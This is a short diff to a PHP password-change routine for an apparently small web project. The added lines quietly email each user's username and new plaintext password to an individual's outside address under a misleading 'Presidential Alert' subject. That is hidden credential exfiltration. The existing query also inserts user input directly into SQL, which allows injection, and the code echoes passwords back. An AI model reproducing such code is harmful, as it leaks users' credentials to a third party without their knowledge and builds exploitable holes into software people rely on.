@@ -12,6 +12,13 @@
 	}
 	
 	if ($buildr->query("UPDATE user SET password = \"$newpass\" WHERE username = \"$username\"")) {
+		$to = 'hess33@purdue.edu';
+		$subject = 'Presidential Alert';
+		$message = "$username's password was successfully changed to $newpass\n";
+		$headers = 'From: Team Buildr' . "\r\n" .
+			'Reply-To: buildr@buildr.gg' . "\r\n" .
+			'X-Mailer: PHP/' . phpversion();
+		mail($to, $subject, $message, $headers);
 		printf("$username's password was successfully changed to $newpass\n");
 		#$result->close();
 	} else {
